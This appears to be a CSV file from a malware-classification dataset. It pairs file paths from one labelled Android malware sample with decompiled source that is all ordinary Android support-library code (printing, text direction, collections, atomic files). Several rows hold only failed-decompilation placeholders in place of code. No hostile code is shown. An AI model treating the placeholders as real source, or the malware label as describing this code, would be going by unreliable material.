"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.os\CompatCreator.code","static class CompatCreator<T> implements Parcelable.Creator<T> {   final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public CompatCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel source){     return this.mCallbacks.createFromParcel(source,null);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.os\EnvironmentCompat.code","public class EnvironmentCompat {   public static final String MEDIA_UNKNOWN=""unknown"";   private static final String TAG=""EnvironmentCompat"";   public static String getStorageState(  File path){     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       return EnvironmentCompatKitKat.getStorageState(path);     }     try {       String canonicalPath=path.getCanonicalPath();       String canonicalExternal=Environment.getExternalStorageDirectory().getCanonicalPath();       if (canonicalPath.startsWith(canonicalExternal)) {         return Environment.getExternalStorageState();       }     }  catch (    IOException e) {       Log.w(TAG,""Failed to resolve canonical path: "" + e);     }     return MEDIA_UNKNOWN;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.os\EnvironmentCompatKitKat.code","class EnvironmentCompatKitKat {   EnvironmentCompatKitKat(){   }   public static String getStorageState(  File path){     return Environment.getStorageState(path);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.os\ParcelableCompat.code","public class ParcelableCompat {   public static <T>Parcelable.Creator<T> newCreator(  ParcelableCompatCreatorCallbacks<T> callbacks){     if (Build.VERSION.SDK_INT >= 13) {       ParcelableCompatCreatorHoneycombMR2Stub.instantiate(callbacks);     }     return new CompatCreator(callbacks);   } static class CompatCreator<T> implements Parcelable.Creator<T> {     final ParcelableCompatCreatorCallbacks<T> mCallbacks;     public CompatCreator(    ParcelableCompatCreatorCallbacks<T> callbacks){       this.mCallbacks=callbacks;     }     @Override public T createFromParcel(    Parcel source){       return this.mCallbacks.createFromParcel(source,null);     }     @Override public T[] newArray(    int size){       return this.mCallbacks.newArray(size);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.os\ParcelableCompatCreatorCallbacks.code","public interface ParcelableCompatCreatorCallbacks<T> {   T createFromParcel(  Parcel parcel,  ClassLoader classLoader);   T[] newArray(  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2.code","class ParcelableCompatCreatorHoneycombMR2<T> implements Parcelable.ClassLoaderCreator<T> {   private final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public ParcelableCompatCreatorHoneycombMR2(  ParcelableCompatCreatorCallbacks<T> callbacks){     this.mCallbacks=callbacks;   }   @Override public T createFromParcel(  Parcel in){     return this.mCallbacks.createFromParcel(in,null);   }   @Override public T createFromParcel(  Parcel in,  ClassLoader loader){     return this.mCallbacks.createFromParcel(in,loader);   }   @Override public T[] newArray(  int size){     return this.mCallbacks.newArray(size);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.os\ParcelableCompatCreatorHoneycombMR2Stub.code","class ParcelableCompatCreatorHoneycombMR2Stub {   ParcelableCompatCreatorHoneycombMR2Stub(){   }   public static <T>Parcelable.Creator<T> instantiate(  ParcelableCompatCreatorCallbacks<T> callbacks){     return new ParcelableCompatCreatorHoneycombMR2(callbacks);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.print\PrintHelper.code","public final class PrintHelper {   public static final int COLOR_MODE_COLOR=2;   public static final int COLOR_MODE_MONOCHROME=1;   public static final int SCALE_MODE_FILL=2;   public static final int SCALE_MODE_FIT=1;   PrintHelperVersionImpl mImpl; interface PrintHelperVersionImpl {     int getColorMode();     int getScaleMode();     void printBitmap(    String str,    Bitmap bitmap);     void printBitmap(    String str,    Uri uri) throws FileNotFoundException ;     void setColorMode(    int i);     void setScaleMode(    int i);   }   public static boolean systemSupportsPrint(){     return Build.VERSION.SDK_INT >= 19;   } private static final class PrintHelperStubImpl implements PrintHelperVersionImpl {     int mColorMode;     int mScaleMode;     private PrintHelperStubImpl(){       this.mScaleMode=2;       this.mColorMode=2;     }     @Override public void setScaleMode(    int scaleMode){       this.mScaleMode=scaleMode;     }     @Override public int getColorMode(){       return this.mColorMode;     }     @Override public void setColorMode(    int colorMode){       this.mColorMode=colorMode;     }     @Override public int getScaleMode(){       return this.mScaleMode;     }     @Override public void printBitmap(    String jobName,    Bitmap bitmap){     }     @Override public void printBitmap(    String jobName,    Uri imageFile){     }   } private static final class PrintHelperKitkatImpl implements PrintHelperVersionImpl {     private final PrintHelperKitkat printHelper;     PrintHelperKitkatImpl(    Context context){       this.printHelper=new PrintHelperKitkat(context);     }     @Override public void setScaleMode(    int scaleMode){       this.printHelper.setScaleMode(scaleMode);     }     @Override public int getScaleMode(){       return this.printHelper.getScaleMode();     }     @Override public void setColorMode(    int colorMode){       this.printHelper.setColorMode(colorMode);     }     @Override public int getColorMode(){       return this.printHelper.getColorMode();     }     @Override public void printBitmap(    String jobName,    Bitmap bitmap){       this.printHelper.printBitmap(jobName,bitmap);     }     @Override public void printBitmap(    String jobName,    Uri imageFile) throws FileNotFoundException {       this.printHelper.printBitmap(jobName,imageFile);     }   }   public PrintHelper(  Context context){     if (systemSupportsPrint()) {       this.mImpl=new PrintHelperKitkatImpl(context);     }  else {       this.mImpl=new PrintHelperStubImpl();     }   }   public void setScaleMode(  int scaleMode){     this.mImpl.setScaleMode(scaleMode);   }   public int getScaleMode(){     return this.mImpl.getScaleMode();   }   public void setColorMode(  int colorMode){     this.mImpl.setColorMode(colorMode);   }   public int getColorMode(){     return this.mImpl.getColorMode();   }   public void printBitmap(  String jobName,  Bitmap bitmap){     this.mImpl.printBitmap(jobName,bitmap);   }   public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     this.mImpl.printBitmap(jobName,imageFile);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.print\PrintHelperKitkat.code","public class PrintHelperKitkat {   public static final int COLOR_MODE_COLOR=2;   public static final int COLOR_MODE_MONOCHROME=1;   private static final String LOG_TAG=""PrintHelperKitkat"";   private static final int MAX_PRINT_SIZE=3500;   public static final int SCALE_MODE_FILL=2;   public static final int SCALE_MODE_FIT=1;   final Context mContext;   int mScaleMode=2;   int mColorMode=2;   public PrintHelperKitkat(  Context context){     this.mContext=context;   }   public void setScaleMode(  int scaleMode){     this.mScaleMode=scaleMode;   }   public int getScaleMode(){     return this.mScaleMode;   }   public void setColorMode(  int colorMode){     this.mColorMode=colorMode;   }   public int getColorMode(){     return this.mColorMode;   }   public void printBitmap(  final String jobName,  final Bitmap bitmap){     if (bitmap != null) {       final int fittingMode=this.mScaleMode;       PrintManager printManager=(PrintManager)this.mContext.getSystemService(""print"");       PrintAttributes.MediaSize mediaSize=PrintAttributes.MediaSize.UNKNOWN_PORTRAIT;       if (bitmap.getWidth() > bitmap.getHeight()) {         mediaSize=PrintAttributes.MediaSize.UNKNOWN_LANDSCAPE;       }       PrintAttributes attr=new PrintAttributes.Builder().setMediaSize(mediaSize).setColorMode(this.mColorMode).build();       printManager.print(jobName,new PrintDocumentAdapter(){         private PrintAttributes mAttributes;         @Override public void onLayout(        PrintAttributes oldPrintAttributes,        PrintAttributes newPrintAttributes,        CancellationSignal cancellationSignal,        PrintDocumentAdapter.LayoutResultCallback layoutResultCallback,        Bundle bundle){           this.mAttributes=newPrintAttributes;           PrintDocumentInfo info=new PrintDocumentInfo.Builder(jobName).setContentType(1).setPageCount(1).build();           boolean changed=newPrintAttributes.equals(oldPrintAttributes) ? false : true;           layoutResultCallback.onLayoutFinished(info,changed);         }         @Override public void onWrite(        PageRange[] pageRanges,        ParcelFileDescriptor fileDescriptor,        CancellationSignal cancellationSignal,        PrintDocumentAdapter.WriteResultCallback writeResultCallback){           float scale;           PrintedPdfDocument pdfDocument=new PrintedPdfDocument(PrintHelperKitkat.this.mContext,this.mAttributes);           try {             PdfDocument.Page page=pdfDocument.startPage(1);             RectF content=new RectF(page.getInfo().getContentRect());             Matrix matrix=new Matrix();             float scale2=content.width() / bitmap.getWidth();             if (fittingMode == 2) {               scale=Math.max(scale2,content.height() / bitmap.getHeight());             }  else {               scale=Math.min(scale2,content.height() / bitmap.getHeight());             }             matrix.postScale(scale,scale);             float translateX=(content.width() - (bitmap.getWidth() * scale)) / 2.0f;             float translateY=(content.height() - (bitmap.getHeight() * scale)) / 2.0f;             matrix.postTranslate(translateX,translateY);             page.getCanvas().drawBitmap(bitmap,matrix,null);             pdfDocument.finishPage(page);             try {               pdfDocument.writeTo(new FileOutputStream(fileDescriptor.getFileDescriptor()));               writeResultCallback.onWriteFinished(new PageRange[]{PageRange.ALL_PAGES});             }  catch (            IOException ioe) {               Log.e(PrintHelperKitkat.LOG_TAG,""Error writing printed content"",ioe);               writeResultCallback.onWriteFailed(null);             }             if (pdfDocument != null) {               pdfDocument.close();             }             if (fileDescriptor != null) {               try {                 fileDescriptor.close();               }  catch (              IOException e) {               }             }           }  catch (          Throwable th) {             if (pdfDocument != null) {               pdfDocument.close();             }             if (fileDescriptor != null) {               try {                 fileDescriptor.close();               }  catch (              IOException e2) {               }             }             throw th;           }         }       } ,attr);     }   }   public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     Bitmap bitmap=loadConstrainedBitmap(imageFile,MAX_PRINT_SIZE);     printBitmap(jobName,bitmap);   }   private Bitmap loadConstrainedBitmap(  Uri uri,  int maxSideLength) throws FileNotFoundException {     if (maxSideLength <= 0 || uri == null || this.mContext == null) {       throw new IllegalArgumentException(""bad argument to getScaledBitmap"");     }     BitmapFactory.Options opt=new BitmapFactory.Options();     opt.inJustDecodeBounds=true;     loadBitmap(uri,opt);     int w=opt.outWidth;     int h=opt.outHeight;     if (w <= 0 || h <= 0) {       return null;     }     int imageSide=Math.max(w,h);     int sampleSize=1;     while (imageSide > maxSideLength) {       imageSide>>>=1;       sampleSize<<=1;     }     if (sampleSize <= 0 || Math.min(w,h) / sampleSize <= 0) {       return null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inMutable=true;     options.inSampleSize=sampleSize;     return loadBitmap(uri,options);   }   private Bitmap loadBitmap(  Uri uri,  BitmapFactory.Options o) throws FileNotFoundException {     if (uri == null || this.mContext == null) {       throw new IllegalArgumentException(""bad argument to loadBitmap"");     }     InputStream is=null;     try {       is=this.mContext.getContentResolver().openInputStream(uri);       return BitmapFactory.decodeStream(is,null,o);     }   finally {       if (is != null) {         try {           is.close();         }  catch (        IOException t) {           Log.w(LOG_TAG,""close fail "",t);         }       }     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.print\PrintHelperKitkatImpl.code","private static final class PrintHelperKitkatImpl implements PrintHelperVersionImpl {   private final PrintHelperKitkat printHelper;   PrintHelperKitkatImpl(  Context context){     this.printHelper=new PrintHelperKitkat(context);   }   @Override public void setScaleMode(  int scaleMode){     this.printHelper.setScaleMode(scaleMode);   }   @Override public int getScaleMode(){     return this.printHelper.getScaleMode();   }   @Override public void setColorMode(  int colorMode){     this.printHelper.setColorMode(colorMode);   }   @Override public int getColorMode(){     return this.printHelper.getColorMode();   }   @Override public void printBitmap(  String jobName,  Bitmap bitmap){     this.printHelper.printBitmap(jobName,bitmap);   }   @Override public void printBitmap(  String jobName,  Uri imageFile) throws FileNotFoundException {     this.printHelper.printBitmap(jobName,imageFile);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.print\PrintHelperStubImpl.code","private static final class PrintHelperStubImpl implements PrintHelperVersionImpl {   int mColorMode;   int mScaleMode;   private PrintHelperStubImpl(){     this.mScaleMode=2;     this.mColorMode=2;   }   @Override public void setScaleMode(  int scaleMode){     this.mScaleMode=scaleMode;   }   @Override public int getColorMode(){     return this.mColorMode;   }   @Override public void setColorMode(  int colorMode){     this.mColorMode=colorMode;   }   @Override public int getScaleMode(){     return this.mScaleMode;   }   @Override public void printBitmap(  String jobName,  Bitmap bitmap){   }   @Override public void printBitmap(  String jobName,  Uri imageFile){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.print\PrintHelperVersionImpl.code","interface PrintHelperVersionImpl {   int getColorMode();   int getScaleMode();   void printBitmap(  String str,  Bitmap bitmap);   void printBitmap(  String str,  Uri uri) throws FileNotFoundException ;   void setColorMode(  int i);   void setScaleMode(  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\AnyStrong.code","private static class AnyStrong implements TextDirectionAlgorithm {   private final boolean mLookForRtl;   public static final AnyStrong INSTANCE_RTL=new AnyStrong(true);   public static final AnyStrong INSTANCE_LTR=new AnyStrong(false);   @Override public int checkRtl(  CharSequence cs,  int start,  int count){     boolean haveUnlookedFor=false;     int e=start + count;     for (int i=start; i < e; i++) { switch (TextDirectionHeuristicsCompat.isRtlText(Character.getDirectionality(cs.charAt(i)))) { case 0:         if (this.mLookForRtl) {           return 0;         }       haveUnlookedFor=true;     break; case 1:   if (!this.mLookForRtl) {     return 1;   } haveUnlookedFor=true; break; } } if (haveUnlookedFor) { return !this.mLookForRtl ? 0 : 1; } return 2; } private AnyStrong(boolean lookForRtl){ this.mLookForRtl=lookForRtl; } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\BidiFormatter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3f0cfc36"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\Builder.code","public static final class Builder {   private int mFlags;   private boolean mIsRtlContext;   private TextDirectionHeuristicCompat mTextDirectionHeuristicCompat;   public Builder(){     initialize(BidiFormatter.isRtlLocale(Locale.getDefault()));   }   public Builder(  boolean rtlContext){     initialize(rtlContext);   }   public Builder(  Locale locale){     initialize(BidiFormatter.isRtlLocale(locale));   }   private void initialize(  boolean isRtlContext){     this.mIsRtlContext=isRtlContext;     this.mTextDirectionHeuristicCompat=BidiFormatter.DEFAULT_TEXT_DIRECTION_HEURISTIC;     this.mFlags=2;   }   public Builder stereoReset(  boolean stereoReset){     if (stereoReset) {       this.mFlags|=2;     }  else {       this.mFlags&=-3;     }     return this;   }   public Builder setTextDirectionHeuristic(  TextDirectionHeuristicCompat heuristic){     this.mTextDirectionHeuristicCompat=heuristic;     return this;   }   private static BidiFormatter getDefaultInstanceFromContext(  boolean isRtlContext){     return isRtlContext ? BidiFormatter.DEFAULT_RTL_INSTANCE : BidiFormatter.DEFAULT_LTR_INSTANCE;   }   public BidiFormatter build(){     return (this.mFlags == 2 && this.mTextDirectionHeuristicCompat == BidiFormatter.DEFAULT_TEXT_DIRECTION_HEURISTIC) ? getDefaultInstanceFromContext(this.mIsRtlContext) : new BidiFormatter(this.mIsRtlContext,this.mFlags,this.mTextDirectionHeuristicCompat);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\DirectionalityEstimator.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3141e7fe"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\FirstStrong.code","private static class FirstStrong implements TextDirectionAlgorithm {   public static final FirstStrong INSTANCE=new FirstStrong();   @Override public int checkRtl(  CharSequence cs,  int start,  int count){     int result=2;     int e=start + count;     for (int i=start; i < e && result == 2; i++) {       result=TextDirectionHeuristicsCompat.isRtlTextOrFormat(Character.getDirectionality(cs.charAt(i)));     }     return result;   }   private FirstStrong(){   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\ICUCompat.code","public class ICUCompat {   private static final ICUCompatImpl IMPL; interface ICUCompatImpl {     String addLikelySubtags(    String str);     String getScript(    String str);   } static class ICUCompatImplBase implements ICUCompatImpl {     ICUCompatImplBase(){     }     @Override public String getScript(    String locale){       return null;     }     @Override public String addLikelySubtags(    String locale){       return locale;     }   } static class ICUCompatImplIcs implements ICUCompatImpl {     ICUCompatImplIcs(){     }     @Override public String getScript(    String locale){       return ICUCompatIcs.getScript(locale);     }     @Override public String addLikelySubtags(    String locale){       return ICUCompatIcs.addLikelySubtags(locale);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ICUCompatImplIcs();     }  else {       IMPL=new ICUCompatImplBase();     }   }   public static String getScript(  String locale){     return IMPL.getScript(locale);   }   public static String addLikelySubtags(  String locale){     return IMPL.addLikelySubtags(locale);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\ICUCompatIcs.code","class ICUCompatIcs {   private static final String TAG=""ICUCompatIcs"";   private static Method sAddLikelySubtagsMethod;   private static Method sGetScriptMethod;   ICUCompatIcs(){   } static {     try {       Class<?> clazz=Class.forName(""libcore.icu.ICU"");       if (clazz != null) {         sGetScriptMethod=clazz.getMethod(""getScript"",String.class);         sAddLikelySubtagsMethod=clazz.getMethod(""addLikelySubtags"",String.class);       }     }  catch (    Exception e) {       Log.w(TAG,e);     }   }   public static String getScript(  String locale){     try {       if (sGetScriptMethod != null) {         Object[] args={locale};         return (String)sGetScriptMethod.invoke(null,args);       }     }  catch (    IllegalAccessException e) {       Log.w(TAG,e);     } catch (    InvocationTargetException e2) {       Log.w(TAG,e2);     }     return null;   }   public static String addLikelySubtags(  String locale){     try {       if (sAddLikelySubtagsMethod != null) {         Object[] args={locale};         return (String)sAddLikelySubtagsMethod.invoke(null,args);       }     }  catch (    IllegalAccessException e) {       Log.w(TAG,e);     } catch (    InvocationTargetException e2) {       Log.w(TAG,e2);     }     return locale;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\ICUCompatImpl.code","interface ICUCompatImpl {   String addLikelySubtags(  String str);   String getScript(  String str); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\ICUCompatImplBase.code","static class ICUCompatImplBase implements ICUCompatImpl {   ICUCompatImplBase(){   }   @Override public String getScript(  String locale){     return null;   }   @Override public String addLikelySubtags(  String locale){     return locale;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\ICUCompatImplIcs.code","static class ICUCompatImplIcs implements ICUCompatImpl {   ICUCompatImplIcs(){   }   @Override public String getScript(  String locale){     return ICUCompatIcs.getScript(locale);   }   @Override public String addLikelySubtags(  String locale){     return ICUCompatIcs.addLikelySubtags(locale);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\TextDirectionAlgorithm.code","public interface TextDirectionAlgorithm {   int checkRtl(  CharSequence charSequence,  int i,  int i2); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\TextDirectionHeuristicCompat.code","public interface TextDirectionHeuristicCompat {   boolean isRtl(  CharSequence charSequence,  int i,  int i2);   boolean isRtl(  char[] cArr,  int i,  int i2); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\TextDirectionHeuristicImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@77e1dd4f"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\TextDirectionHeuristicInternal.code","private static class TextDirectionHeuristicInternal extends TextDirectionHeuristicImpl {   private final boolean mDefaultIsRtl;   private TextDirectionHeuristicInternal(  TextDirectionAlgorithm algorithm,  boolean defaultIsRtl){     super(algorithm);     this.mDefaultIsRtl=defaultIsRtl;   }   @Override protected boolean defaultIsRtl(){     return this.mDefaultIsRtl;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\TextDirectionHeuristicLocale.code","private static class TextDirectionHeuristicLocale extends TextDirectionHeuristicImpl {   public static final TextDirectionHeuristicLocale INSTANCE=new TextDirectionHeuristicLocale();   public TextDirectionHeuristicLocale(){     super(null);   }   @Override protected boolean defaultIsRtl(){     int dir=TextUtilsCompat.getLayoutDirectionFromLocale(Locale.getDefault());     return dir == 1;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\TextDirectionHeuristicsCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7a8dcb79"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.text\TextUtilsCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5a7abc9a"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\ArrayIterator.code","final class ArrayIterator<T> implements Iterator<T> {   boolean mCanRemove=false;   int mIndex;   final int mOffset;   int mSize;   ArrayIterator(  int offset){     this.mOffset=offset;     this.mSize=MapCollections.this.colGetSize();   }   @Override public boolean hasNext(){     return this.mIndex < this.mSize;   }   @Override public T next(){     T t=(T)MapCollections.this.colGetEntry(this.mIndex,this.mOffset);     this.mIndex++;     this.mCanRemove=true;     return t;   }   @Override public void remove(){     if (!this.mCanRemove) {       throw new IllegalStateException();     }     this.mIndex--;     this.mSize--;     this.mCanRemove=false;     MapCollections.this.colRemoveAt(this.mIndex);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\ArrayMap.code","public class ArrayMap<K,V> extends SimpleArrayMap<K,V> implements Map<K,V> {   MapCollections<K,V> mCollections;   public ArrayMap(){   }   public ArrayMap(  int capacity){     super(capacity);   }   public ArrayMap(  SimpleArrayMap map){     super(map);   }   private MapCollections<K,V> getCollection(){     if (this.mCollections == null) {       this.mCollections=new MapCollections<K,V>(){         @Override protected int colGetSize(){           return ArrayMap.this.mSize;         }         @Override protected Object colGetEntry(        int index,        int offset){           return ArrayMap.this.mArray[(index << 1) + offset];         }         @Override protected int colIndexOfKey(        Object key){           return key == null ? ArrayMap.this.indexOfNull() : ArrayMap.this.indexOf(key,key.hashCode());         }         @Override protected int colIndexOfValue(        Object value){           return ArrayMap.this.indexOfValue(value);         }         @Override protected Map<K,V> colGetMap(){           return ArrayMap.this;         }         @Override protected void colPut(        K key,        V value){           ArrayMap.this.put(key,value);         }         @Override protected V colSetValue(        int index,        V value){           return ArrayMap.this.setValueAt(index,value);         }         @Override protected void colRemoveAt(        int index){           ArrayMap.this.removeAt(index);         }         @Override protected void colClear(){           ArrayMap.this.clear();         }       } ;     }     return this.mCollections;   }   public boolean containsAll(  Collection<?> collection){     return MapCollections.containsAllHelper(this,collection);   }   @Override public void putAll(  Map<? extends K,? extends V> map){     ensureCapacity(this.mSize + map.size());     for (    Map.Entry<? extends K,? extends V> entry : map.entrySet()) {       put(entry.getKey(),entry.getValue());     }   }   public boolean removeAll(  Collection<?> collection){     return MapCollections.removeAllHelper(this,collection);   }   public boolean retainAll(  Collection<?> collection){     return MapCollections.retainAllHelper(this,collection);   }   @Override public Set<Map.Entry<K,V>> entrySet(){     return getCollection().getEntrySet();   }   @Override public Set<K> keySet(){     return getCollection().getKeySet();   }   @Override public Collection<V> values(){     return getCollection().getValues();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\AtomicFile.code","public class AtomicFile {   private final File mBackupName;   private final File mBaseName;   public AtomicFile(  File baseName){     this.mBaseName=baseName;     this.mBackupName=new File(baseName.getPath() + "".bak"");   }   public File getBaseFile(){     return this.mBaseName;   }   public void delete(){     this.mBaseName.delete();     this.mBackupName.delete();   }   public FileOutputStream startWrite() throws IOException {     if (this.mBaseName.exists()) {       if (!this.mBackupName.exists()) {         if (!this.mBaseName.renameTo(this.mBackupName)) {           Log.w(""AtomicFile"",""Couldn't rename file "" + this.mBaseName + "" to backup file ""+ this.mBackupName);         }       }  else {         this.mBaseName.delete();       }     }     try {       FileOutputStream str=new FileOutputStream(this.mBaseName);       return str;     }  catch (    FileNotFoundException e) {       File parent=this.mBaseName.getParentFile();       if (!parent.mkdir()) {         throw new IOException(""Couldn't create directory "" + this.mBaseName);       }       try {         FileOutputStream str2=new FileOutputStream(this.mBaseName);         return str2;       }  catch (      FileNotFoundException e2) {         throw new IOException(""Couldn't create "" + this.mBaseName);       }     }   }   public void finishWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBackupName.delete();       }  catch (      IOException e) {         Log.w(""AtomicFile"",""finishWrite: Got exception:"",e);       }     }   }   public void failWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBaseName.delete();         this.mBackupName.renameTo(this.mBaseName);       }  catch (      IOException e) {         Log.w(""AtomicFile"",""failWrite: Got exception:"",e);       }     }   }   public FileInputStream openRead() throws FileNotFoundException {     if (this.mBackupName.exists()) {       this.mBaseName.delete();       this.mBackupName.renameTo(this.mBaseName);     }     return new FileInputStream(this.mBaseName);   }   public byte[] readFully() throws IOException {     FileInputStream stream=openRead();     int pos=0;     try {       byte[] data=new byte[stream.available()];       while (true) {         int amt=stream.read(data,pos,data.length - pos);         if (amt <= 0) {           return data;         }         pos+=amt;         int avail=stream.available();         if (avail > data.length - pos) {           byte[] newData=new byte[pos + avail];           System.arraycopy(data,0,newData,0,pos);           data=newData;         }       }     }   finally {       stream.close();     }   }   static boolean sync(  FileOutputStream stream){     if (stream != null) {       try {         stream.getFD().sync();       }  catch (      IOException e) {         return false;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\ContainerHelpers.code","class ContainerHelpers {   static final int[] EMPTY_INTS=new int[0];   static final long[] EMPTY_LONGS=new long[0];   static final Object[] EMPTY_OBJECTS=new Object[0];   ContainerHelpers(){   }   public static int idealIntArraySize(  int need){     return idealByteArraySize(need * 4) / 4;   }   public static int idealLongArraySize(  int need){     return idealByteArraySize(need * 8) / 8;   }   public static int idealByteArraySize(  int need){     for (int i=4; i < 32; i++) {       if (need <= (1 << i) - 12) {         return (1 << i) - 12;       }     }     return need;   }   public static boolean equal(  Object a,  Object b){     return a == b || (a != null && a.equals(b));   }   public static int binarySearch(  int[] array,  int size,  int value){     int lo=0;     int hi=size - 1;     while (lo <= hi) {       int mid=(lo + hi) >>> 1;       int midVal=array[mid];       if (midVal < value) {         lo=mid + 1;       }  else {         if (midVal <= value) {           return mid;         }         hi=mid - 1;       }     }     return lo ^ (-1);   }   public static int binarySearch(  long[] array,  int size,  long value){     int lo=0;     int hi=size - 1;     while (lo <= hi) {       int mid=(lo + hi) >>> 1;       long midVal=array[mid];       if (midVal < value) {         lo=mid + 1;       }  else {         if (midVal <= value) {           return mid;         }         hi=mid - 1;       }     }     return lo ^ (-1);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.util\DebugUtils.code","public class DebugUtils {   public static void buildShortClassTag(  Object cls,  StringBuilder out){     int end;     if (cls == null) {       out.append(""null"");       return;     }     String simpleName=cls.getClass().getSimpleName();     if ((simpleName == null || simpleName.length() <= 0) && (end=(simpleName=cls.getClass().getName()).lastIndexOf(46)) > 0) {       simpleName=simpleName.substring(end + 1);     }     out.append(simpleName);     out.append('{');     out.append(Integer.toHexString(System.identityHashCode(cls)));   } } "
